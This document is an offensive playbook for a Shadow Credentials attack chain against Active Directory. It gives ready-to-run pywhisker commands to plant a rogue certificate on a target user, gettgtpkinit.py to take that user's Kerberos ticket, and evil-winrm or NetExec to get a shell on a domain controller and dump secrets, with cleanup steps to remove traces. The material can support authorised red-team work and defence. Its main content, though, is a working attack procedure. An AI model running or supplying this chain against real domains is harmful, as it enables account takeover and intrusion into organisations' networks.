## Attack Chain: Shadow Credentials -> PKINIT TGT -> Kerberos Shell

**Primary Goal:** Abuse the `msDS-KeyCredentialLink` attribute to register a rogue certificate for a target user, extract a Kerberos Ticket Granting Ticket (TGT) using PKINIT, and obtain an interactive remote shell via Pass-the-Ticket (PtT).

**TL;DR:** This playbook details the exploitation of Shadow Credentials in Active Directory. By utilizing `pywhisker`, an attacker writes a malicious certificate to a vulnerable user's account. This certificate is then used via PKINIT to request a valid Kerberos TGT without knowing the user's plaintext password or NT hash, culminating in an interactive session via WinRM.

### High-Level Attack Flow

1. **Inject Shadow Credential:** Identify a user account where you hold write privileges over the `msDS-KeyCredentialLink` attribute and use `pywhisker` to inject a rogue certificate.
2. **Request TGT:** Use the resulting `.pfx` certificate to request a Ticket Granting Ticket (TGT) via `gettgtpkinit.py`.
3. **Export Ticket:** Load the downloaded `.ccache` ticket into your current environment variables.
4. **Verify Ticket:** Confirm the ticket is successfully cached and valid using `klist`.
5. **Pass-the-Ticket (PtT):** Leverage Kerberos authentication tooling (like Evil-WinRM) to pass the ticket and obtain an interactive shell on the target system.

### Prerequisites

- `pywhisker` installed and working (`pip install -r requirements.txt`).
- `PKINITtools` suite available (with any necessary `oscrypto` fixes applied).
- The attacker host's `/etc/krb5.conf` must be correctly configured to point to the target realm and Domain Controller.
- DNS resolution must be functioning (ensure `/etc/hosts` maps the Domain Controller FQDN correctly).
- **Crucial:** Strict time synchronization with the Domain Controller is maintained, as Kerberos requires timestamps to be within 5 minutes.

### Step 1: Inject the Shadow Credential (`pywhisker`)

Assuming you have compromised an account with the necessary Discretionary Access Control List (DACL) rights (e.g., `GenericWrite` or `WriteProperty` over the target user), use `pywhisker` to register a new Key Credential Link.

```
# Register the malicious certificate for the target user (alice)
python3 pywhisker.py add \
  -d domain.local \
  -u COMPROMISED_USER \
  -p 'Compromised_Password1!' \
  --target "alice@domain.local" \
  --pfx alice.pfx \
  --pass alicePFXpass
```

*Note: Ensure the `.pfx` file is saved successfully. This command assumes you are authenticating as a previously compromised user to attack the target user `alice`.*

### Step 2: Request the TGT via PKINIT

With the rogue certificate generated, authenticate to the Domain Controller via PKINIT. This asks the DC to grant you a TGT for `alice` based on the trusted certificate, completely bypassing the need for her NT hash or plaintext password.

```
# Request the TGT using the generated PFX file
python3 gettgtpkinit.py domain.local/alice@DOMAIN.LOCAL \
  -cert-pfx alice.pfx \
  -pfx-pass alicePFXpass \
  -dc-ip DC_IP \
  alice.ccache
```

### Step 3: Export and Verify the Ticket

To use the Ticket Granting Ticket with standard tools, you must export the `.ccache` file into your current shell's environment variables.

```
# Set the KRB5CCNAME environment variable
export KRB5CCNAME=$(pwd)/alice.ccache

# Verify the ticket is loaded and valid
klist
```

*Result: `klist` should display a valid Kerberos ticket for the principal `alice@DOMAIN.LOCAL`.*

### Step 4: Establish Kerberos Shell (Pass-the-Ticket)

With the TGT loaded in your environment, you can now perform a Pass-the-Ticket (PtT) attack. Use `evil-winrm` with the realm flag (`-r`) to instruct it to use Kerberos authentication instead of standard NTLM.

```
# Connect via WinRM using the cached Kerberos ticket
evil-winrm -i dc01.domain.local -r domain.local
```

*Note: You can also use tools like NetExec (`nxc smb dc01.domain.local -k --use-kcache`) to execute commands or dump secrets via SMB. Ensure you use the FQDN, not the IP address, when passing Kerberos tickets.*

## Operational Security (OPSEC) Considerations & Cleanup

### Troubleshooting

- **pywhisker failures:** If the `add` command fails, verify your compromised user actually possesses the required DACL permissions over the target user. Check if the environment requires specific LDAP signing/channel binding.
- **PKINIT errors:** If TGT generation fails, verify the domain actually supports PKINIT (a Certificate Authority must be configured and issuing Domain Controller certificates). Double-check your time synchronization (`ntpdate DC_IP`).
- **WinRM connection issues:** Ensure you are using the Fully Qualified Domain Name (FQDN) of the target (e.g., `dc01.domain.local`), not just the IP address, as Kerberos relies strictly on Service Principal Names (SPNs).

### Cleanup Procedures

Once the objective is achieved, it is highly recommended to remove the rogue credential to restore the account to its original state and avoid leaving a permanent backdoor.

```
# Remove the injected shadow credential
python3 pywhisker.py remove \
  -d domain.local \
  -u COMPROMISED_USER \
  -p 'Compromised_Password1!' \
  --target "alice@domain.local" \
  --device-id "DEVICE_ID_FROM_ADD_COMMAND"
```

- Make sure to securely delete the `alice.pfx` and `alice.ccache` files from your attacker infrastructure.
